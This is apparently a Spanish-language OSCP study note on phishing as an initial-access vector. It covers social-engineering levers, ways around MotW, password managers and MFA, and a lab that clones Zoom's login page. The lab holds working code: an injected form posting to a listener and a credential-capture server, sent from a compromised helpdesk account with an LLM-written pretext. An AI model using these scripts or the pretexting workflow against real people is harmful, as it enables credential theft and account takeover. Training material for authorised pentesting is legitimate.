---
tipo: modulo
modulo: 11
estado: repasado
tags:
  - oscp
  - explotacion
  - phishing
  - social-engineering
  - linux
  - windows
fecha: 2026-09-28
---

# 11 - Phishing Basics

> [!abstract] Resumen
> Fundamentos de **phishing** e ingeniería social como vector de **acceso inicial**. Dos objetivos posibles: **ejecutar código** (adjunto/enlace malicioso) o **robar credenciales** (sitio clonado). Cubre: tipos (broad vs spear, whaling, smishing, vishing, clone phishing), palancas psicológicas (confianza, urgencia, miedo, autoridad, baiting), defensas a sortear (filtros de correo, MotW, macros bloqueadas, password managers, MFA) y un **lab práctico** de credential phishing clonando la web de Zoom + servidor que captura credenciales.
> Hilo conductor: un **pretexto creíble** que se alinea con el payload; el uso de **Gen AI/LLMs** para investigar y redactar; y el detalle técnico (dominios lookalike, HTTPS válido) que evita levantar sospechas.

## Conceptos clave
- **Broad vs spear phishing**: masivo/genérico vs dirigido y personalizado (requiere OSINT). **Whaling** = spear contra perfiles de alto nivel (C-level).
- **Pretexto**: la historia falsa que convence de abrir el enlace/adjunto. Debe alinearse con las expectativas del target y con el payload. Errores (typos, mala gramática, formato) lo delatan.
- **Medios**: email (el clásico), **smishing** (SMS), **vishing** (voz/llamada), chat (Slack/Teams/Discord). Caller ID spoofing (VoIP) y **SIM swapping** (robar el nº para saltar MFA por SMS).
- **Clone phishing**: imitar un servicio conocido (Gmail, Zoom, Microsoft) con web clonada; útil a gran escala.
- **Palancas de ingeniería social**: **confianza** (la más importante), **urgencia**, **miedo**, **autoridad** (hacerse pasar por un jefe/CEO), **baiting** (recompensa: gift card, premio).
- **Gen AI / LLMs**: investigación (RAG sobre datos públicos), redacción del pretexto imitando un estilo, **voice cloning** y **deepfakes** (caso Arup 2024, transferencia de $25M).
- **Objetivo del examen/pentest**: normalmente **credential harvesting** con web clonada → reusar credenciales para expandir el acceso.

> [!tip] Idea para el examen
> El lab clave es **clonar un login y capturar credenciales**. Flujo: `single-file` clona la página completa (mejor que `wget` para JS/CSS embebido) → script Python (BeautifulSoup) que arregla el formulario y apunta el POST a tu servidor → `cred_server.py` en :8080 captura y redirige a la web real (302) para simular login fallido. Sirve el clon con `python3 -m http.server 80`. **En real: sustituir `127.0.0.1` por la IP de Kali** en el `form action` y en el listener.

---

## 11.1 Phishing 101

### Email phishing
- **Dos vías de payload**: (1) **adjunto** malicioso (Office/PDF/ZIP/LNK/invitación de calendario) que ejecuta código; (2) **enlace** a web con exploit de navegador o a un **clon** que roba credenciales.
- Para que el correo pase el filtro humano: origen familiar/benigno + metadatos coherentes. Los atacantes compran **dominios lookalike** (de la org, de un proveedor o de un servicio conocido) o usan una **cuenta legítima comprometida** (breach/credenciales filtradas) → mucho más efectivo.
- El pretexto se adapta al departamento (ej. correos que RRHH esperaría recibir).

> [!important] En un engagement de phishing real, el cliente suele dar una **lista de emails prohibidos** (normalmente perfiles de alto nivel) que NO se pueden atacar.

### Smishing, vishing y chat
- **Smishing** (SMS): más personal y directo que el email. Contexto laboral si es teléfono de trabajo; referencias a familia/amigos si es personal. Como el nº no está en contactos, hay que añadir pretexto (ej. *"CEO gift card scam"*).
- **Vishing** (voz): llamada directa; casi todo skill social, poco técnico.
- **Caller ID spoofing** (VoIP) para falsear el nº. **SIM swapping**: convencer a la operadora de portar el nº del target a una SIM del atacante → sirve para saltar **MFA por SMS**.

### Ingeniería social — palancas
| Palanca | Cómo se usa |
|---|---|
| **Confianza** | Base de todo: pretexto coherente, tono familiar, rapport previo |
| **Urgencia** | Forzar a actuar sin pensar (funciona en culturas laborales tóxicas) |
| **Miedo** | Suspende el juicio del target |
| **Autoridad** | Hacerse pasar por superior/CEO; amplifica la urgencia |
| **Baiting** | Ofrecer algo tangible (gift card, premio, encuesta con recompensa) |

### LLMs, Gen AI y deepfakes
- LLMs para **research** (RAG sobre info pública; contra perfiles conocidos puede no hacer falta ni RAG) y para **redactar** emails/webs con el estilo adecuado.
- **Voice cloning**: modelo de voz con poco audio → decir lo que quieras. **Deepfake video**: caso **Arup (2024)**, deepfakes del CFO y staff en videollamada autorizaron una transferencia de **$25M**.

---

## 11.2 Payloads, misdirection y speedbumps (defensas a sortear)

### Filtros de correo entrante
- Evalúan **reputación del dominio** (block lists + antigüedad del dominio) y **escanean adjuntos**. Muy vigilados: **EXE, SCR**; también Office/PDF/ZIP/scripts y enlaces a esos ficheros.
- Muchas orgs marcan el correo externo con un prefijo visible tipo **`[EXTERNAL]`** en el asunto.

### Macros de Office (VBA)
- Office soporta **VBA** → macros. Vector histórico (Melissa, 1999).
- Mitigaciones de Microsoft: macros **deshabilitadas por defecto**, **Mark of the Web (MotW)**, **Protected View**, y desde hace poco **bloqueo por defecto de macros en ficheros con MotW**. Group Policy (AD) puede forzarlo sin que el usuario lo pueda saltar.
- **MotW**: atributo que Windows pone a los ficheros descargados de fuente externa (por defecto en NTFS). En *Propiedades* del fichero aparece *"This file came from another computer and might be blocked..."* con un checkbox **Unblock**. Bypass conocido: **CVE-2022-41091** (parcheado rápido).
- Siguen siendo útiles porque muchas orgs usan Office desactualizado o GPO básicas.

### Ficheros maliciosos sin macros
Otros tipos que ejecutan código cliente: **SCR, HTA, JScript**, y Office "ancilares". Vulns de parsing conocidas:
| CVE | Software | Nota |
|---|---|---|
| CVE-2017-11882 | Equation Editor (Office ≤2018) | Memory corruption; explotación vista aún en 2023 |
| CVE-2023-21716 | Word (parser RTF) | PoC público |
| CVE-2023-21608 | Adobe Acrobat Reader | Use-after-free, RCE |
> Contra targets concretos: investigar el software que usan (job postings, LinkedIn, Glassdoor, G2/Capterra) y buscar vulns (incluso 0-days / N-days por *patch diffing*).

### Enlaces maliciosos
- **Credential harvesting**: clon de un servicio (Gmail/Zoom/Microsoft) + pretexto → el target mete credenciales reales.
- **Roadblock: password managers** — solo autorrellenan en el **dominio correcto** (no meten la pass de `microsoft.com` en `m1cros0ft.com`). Han tenido vulns (LastPass 2016/2017, 1Password Safari 2021, AutoSpill Android 2023) pero no siempre explotables → siguen siendo obstáculo.
- **Ofuscar la URL**: acortadores (TinyURL/Bitly, pueden ser baneados) o **homoglyph/homograph URLs** (sustituir caracteres ASCII por cirílicos/griegos: `apple.com` vs `аррӏе.com`).
- **HTTPS válido obligatorio** (sitios sin TLS son raros y el navegador avisa).
- Otros vectores del enlace: **exploit de navegador** (necesita 0-day/N-day fiable + navegador vulnerable), **CSRF** (ej. CVE-2024-1879 en AutoGPT → RCE) y **fuga de auth NTLM**: enlace/imagen a un recurso SMB que fuerza el handshake → capturar el **hash NetNTLMv2** (visto aún en feb-2024).

### Credential phishing vs MFA
Aun con credenciales, la **MFA** frena. Técnicas para sortearla:
- **Prompt bombing / MFA fatigue**: bombardear con logins hasta que el usuario apruebe un push por cansancio (usado por **Lapsus$**).
- **Capturar el token en el propio clon**: añadir el prompt MFA al flujo de login y **relayar el token de inmediato** (vida corta → timing crítico; acceso de un solo uso).
- **Browser-in-the-middle**: proxear la sesión real y quedarse con la cookie de sesión + token (tool: **cuddlephish**; necesita IP pública, no se monta en local).
- **Brute-force** del token (6 dígitos; poco realista si hay rate limiting).
- **Ingeniería social**: llamar como helpdesk/IT y pedir el token.
- **SIM swapping** (MFA por SMS) — no aplicable en pentesting legal.

---

## 11.3 Lab práctico: credential phishing (clon de Zoom)

Escenario: tenemos una cuenta de helpdesk comprometida (`helpdesk@mail.corp.com` / `Helpdesk@Password2024`) por un leak. Objetivo: phishear al dept. de ventas con un clon de Zoom.

### 1) Reconocimiento del buzón + pretexto con LLM
Webmail (Roundcube) en `http://192.168.X.77/mail/`. Leer los **Sent**: hay un correo real *"Zoom License Inventory Refresh"* pidiendo a ventas que entren en Zoom para mantener la licencia. Se copia ese **estilo** y se pide a un LLM (ChatGPT) que redacte otro email similar con un **hyperlink** ("click here").

### 2) Clonar la web (SingleFile, no wget)
Primer intento con `wget` (falla por JS externo → alerta *OWASP CSRFGuard*):
```bash
mkdir ZoomSignin && cd ZoomSignin
wget -E -k -K -p -e robots=off -nd "https://zoom.us/signin#/login"
sudo python -m http.server 80        # servir y probar en http://127.0.0.1/signin.html
```
| Flag wget | Qué hace |
|---|---|
| `-E` | Ajusta extensión al MIME real |
| `-k` | Reescribe enlaces a versiones locales |
| `-K` | Guarda el original con `.orig` |
| `-p` | Descarga todo lo necesario para ver la página |
| `-e robots=off` | Ignora `robots.txt` |
| `-nd` | Todo plano en el cwd (sin árbol de dirs) |

Solución: **SingleFile CLI** (renderiza con Chromium y embebe todo en un solo HTML):
```bash
rm -rf ./*
sudo apt install nodejs npm chromium -y
sudo npm install -g single-file-cli
single-file "https://zoom.us/signin" signin.html --browser-executable-path /usr/bin/chromium
```
> [!warning] `wget` captura HTML/CSS pero **no la lógica JS** (Vue.js) del login → los elementos no funcionan y el JS externo dispara la alerta CSRFGuard. SingleFile deja un clon visualmente idéntico, pero **los formularios siguen sin funcionar** (hay que reconstruirlos).

### 3) Arreglar el clon (script Python + BeautifulSoup)
Localizar el id del botón *Next*:
```bash
grep -oP '.{0,100}Next</span>' signin.html      # -> id=signin_btn_next
```
Script que en una pasada: **(a)** elimina el banner OneTrust (por id), **(b)** añade `onclick="goToPassword()"` al botón Next + soporte de tecla Enter, **(c)** inyecta un **overlay** con el formulario de contraseña (flujo de 2 pasos email→password) que hace `POST` a `http://127.0.0.1:8080/creds`, y **(d)** un banner de cookies falso que solo se oculta.
```bash
cd ~/ZoomSignin && python3 << 'PYEOF'
from bs4 import BeautifulSoup
with open('signin.html') as f: html = f.read()
soup = BeautifulSoup(html, "html.parser")
for elem_id in ["onetrust-consent-sdk","onetrust-banner-sdk","onetrust-pc-sdk","ot-sdk-btn-floating","ot-cookie-notice"]:
    el = soup.find(id=elem_id)
    if el: el.decompose()
html = str(soup)
html = html.replace('id="signin_btn_next"', 'id="signin_btn_next" onclick="goToPassword()"')
# + overlay de password (form action -> http://127.0.0.1:8080/creds) + JS goToPassword() + banner cookies
with open('signin.html','w') as f: f.write(html)
PYEOF
```
> [!tip] El overlay se posiciona solo en la mitad derecha (46% desde la izq.) para que el header y la imagen lateral de Zoom sigan visibles debajo → parece el flujo real de dos pasos.

### 4) Servidor de captura de credenciales
`cred_server.py`: escucha POST en :8080, imprime email/password y redirige (302) a la web real de Zoom (simula login fallido).
```python
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        raw = self.rfile.read(length).decode()
        data = parse_qs(raw)
        print(f"[+] Email: {data.get('email',[''])[0]}  Password: {data.get('password',[''])[0]}")
        self.send_response(302)
        self.send_header('Location', 'https://zoom.us/signin')
        self.end_headers()
    def do_GET(self):
        self.send_response(200); self.end_headers()
HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
```
Levantar todo (dos terminales):
```bash
python3 cred_server.py               # captura en :8080
sudo python3 -m http.server 80       # sirve el clon en :80
```
Salida al capturar:
```
[+] Raw data: email=j.smith.sales%40corp.com&password=W00tw00t%21%21
[+] Captured credentials!
    Email:    j.smith.sales@corp.com
    Password: W00tw00t!!
```

### 5) Enviar el email desde la cuenta comprometida
- Acceder al webmail (`https://192.168.X.77/mail/`) → Firefox avisa *"Warning: Potential Security Risk Ahead"* → **Advanced → Accept the Risk and Continue** (cert autofirmado del lab).
- Login como `helpdesk@mail.corp.com`, ir a **Sent**, abrir el correo de Zoom y **Reply all**.
- Pegar el texto del LLM y, en **modo HTML** (icono de imagen/editor), insertar el **hyperlink** (`Insert/Edit Link`) apuntando al clon: `http://192.168.X.X/signin.html#/login` con texto visible "here".
- **Send**.

> [!tip] En el lab no se usa FQDN por limitaciones de DNS; en real se hostearía en un **dominio lookalike** coherente con el pretexto de Zoom y con HTTPS válido.

---

## Ejemplo práctico
> [!example] Flujo de credential phishing (lab)
> 1. **Acceso** a cuenta legítima (helpdesk) por leak → leer Sent para copiar tono y encontrar un pretexto real (licencias Zoom).
> 2. **Pretexto** con LLM imitando el estilo + enlace.
> 3. **Clon**: `single-file` → script BeautifulSoup (arregla form, POST a tu :8080) → `cred_server.py` (captura + 302 a la web real).
> 4. **Servir** clon en :80, listener en :8080.
> 5. **Enviar** el email por *Reply all* desde helpdesk con el hyperlink al clon.
> 6. La víctima entra sus credenciales → aparecen en el terminal del `cred_server`.

## Relacionado
- Técnicas: [[Website Cloning para Credential Phishing]]
- Cheatsheet: [[Password Attacks]]
- Máquinas donde lo usé: [[]]

## Dudas
> [!question]
> - Repasar captura de **NetNTLMv2** vía enlace/imagen a SMB (relacionar con módulos de AD / Responder).
> - Diferencia práctica entre capturar token MFA en el clon vs **browser-in-the-middle** (cuddlephish) — ¿cuándo cada uno?
> - Bypass de **MotW** (CVE-2022-41091) y formatos que no lo heredan bien (contenedores ISO/IMG) — ¿entra en el examen?
